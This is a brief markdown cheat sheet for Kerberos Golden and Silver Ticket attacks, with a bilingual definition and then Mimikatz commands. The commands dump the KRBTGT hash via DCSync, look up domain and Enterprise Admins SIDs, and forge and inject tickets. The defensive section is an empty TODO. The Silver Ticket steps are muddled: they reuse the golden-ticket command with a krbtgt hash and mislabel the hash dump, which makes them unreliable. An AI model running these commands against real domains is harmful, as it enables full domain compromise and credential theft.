# Golden Ticket/Silver Ticket

## What is this RU 
**Silver Ticket** - это вид атаки на Kerberos, когда злоумышленник использует украденный Kerberos-токен для получения доступа к ресурсам, не подконтрольным доменному контроллеру.
## What is thus EN 
**Silver Ticket** - is a type of Kerberos attack where an attacker uses a stolen Kerberos token to gain access to resources outside the domain controller's control.

## Explotation Golden ticket

We will again use Mimikatz with a DC Sync to recover the KRBTGT password hash on target:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:mssql\krbtgt
Hash NTLM: 16f9af38fca3ada405386b3b57366082
```

SID DC 
```
Get-ADComputer -Identity "DC.DOMAIN.LOCAL"
```

SID Enterprise Admins
```
Get-ADGroup -Identity "Enterprise Admins" -Server dc.domain.local
```

Mimikatz Golden Ticket 
```
kerberos::golden /user:Administrator /domain:mssql.domain.local /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
```

## Explotation Silver ticket

Get User NTLM
```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

Explotation with mimikatz
```
.\mimikatz.exe "kerberos::golden /user:username /domain:controller.local /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:Forging user's RID /sid:SID of the current user who is forging the ticket " "exit"
```

## TODO Prevent